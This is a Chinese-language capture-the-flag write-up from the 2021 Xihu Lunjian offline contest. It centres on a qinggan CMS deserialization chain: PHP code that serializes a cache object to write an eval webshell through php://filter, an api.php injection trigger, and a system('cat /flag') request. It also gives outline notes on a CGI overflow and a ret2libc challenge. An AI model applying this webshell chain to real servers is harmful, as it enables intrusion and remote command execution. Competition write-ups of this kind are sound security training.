---
title: 西湖论剑线下-WriteUp
contest: 西湖论剑线下
year: 2021
difficulty: hard
vuln_type: pwn_unknown
tags: [phpggc, qinggan-OA, base64-decode-filter, cache-deserialize, CGI-auth, content-length-overflow, pwntools-IO, ret2libc, ROP, DPR-target]
attack_chain:
- 单点渗透web:cache类__construct+key_id="php://filter/write=convert.base64-decode/resource=somnus"+folder="aa".base64_encode('<?php eval($_REQUEST["a"]);?>')
- 触发:qinggan_fields INSERT INTO序列化cache对象→/api.php?c=call&data=...→写somnus.php
- 访问:http://114.5.18.20/somnus.php?a=system('cat /flag')得flag
- DPR纵深渗透靶场:sub_109F0检查auth+sub_10B48处理GET/POST+CONTENT_LENGTH<=3316
- calloc+stdin fread→/api子函数处理
- CGI程序:读取SERVER_SOFTWARE/SERVER_NAME/GATEWAY_INTERFACE/SERVER_PROTOCOL/SERVER_PORT/REQUEST_METHOD/PATH_INFO
- 关键漏洞:CONTENT_LENGTH>3316可能溢出
- 内核PWN:栈溢出+ret2libc
- 总结:35道题,涵盖Web/Pwn/IoT/密码学
key_payload: php://filter/write=convert.base64-decode/resource=somnus + cache反序列化
one_liner: 西湖论剑线下WriteUp,单点渗透web(qinggan-OA+phpggc+cache类反序列化+php://filter写somnus.php)+DPR纵深渗透靶场(CGI auth+CONTENT_LENGTH溢出)+IoT路由器环境变量读取。
lesson: 国产CMS的cache类反序列化是常见入口,php://filter/write=convert.base64-decode是写入Webshell的稳定向量;DPR类纵深靶场是工业控制/IoT场景的标配;线下赛35道题覆盖广。
quality: high
---

## 题目列表

35道题覆盖Web/Pwn/IoT/Crypto:
- 单点渗透web:qinggan-OA+cache反序列化
- DPR纵深渗透靶场:工业控制+IoT
- 多个独立PWN题

## 关键考点

### 单点渗透web(qinggan-OA)
```php
class cache {
    protected $key_id;
    protected $key_list;
    protected $folder;
    public function __construct() {
        $this->key_id = "php://filter/write=convert.base64-decode/resource=somnus";
        $this->folder = "";
        $a = '<?php eval($_REQUEST["a"]);?>';
        $this->key_list = "aa".base64_encode($a);
    }
}
$c = new cache();
echo bin2hex(serialize($c));
```
- 写入:qinggan_fields INSERT INTO序列化cache对象
- payload:/api.php?c=call&data={"m_picplayer":{"type_id":"sql","cache":"false","sqlinfo":"INSERT INTO qinggan_fields(...,$hexcache...,0,0,'test','test');"}}
- 触发序列化写入somnus.php
- 访问:http://114.5.18.20/somnus.php?a=system('cat /flag')

### DPR纵深渗透靶场
- IOT C程序:sub_109F0检查auth
- puts("Content-Type: text/plain\n")
- s1 = getenv("REQUEST_METHOD")
- GET:sub_10B48(QUERY_STRING)
- POST:CONTENT_TYPE必须application/x-www-form-urlencoded
- CONTENT_LENGTH:atoi后calloc+stdin fread
- 限制:CONTENT_LENGTH <= 3316

### CGI环境变量
- SERVER_SOFTWARE
- SERVER_NAME
- GATEWAY_INTERFACE
- SERVER_PROTOCOL
- SERVER_PORT
- REQUEST_METHOD
- PATH_INFO

### 内核PWN
- 栈溢出+ret2libc
- 多个ROP gadget

## 实战价值
- 国产CMS的cache类反序列化是常见入口
- php://filter/write=convert.base64-decode是写入Webshell的稳定向量
- qinggan-OA是国产CMS代表
- DPR类纵深靶场是工业控制/IoT场景的标配
- 线下赛35道题覆盖Web+Pwn+IoT+Crypto,综合能力要求高
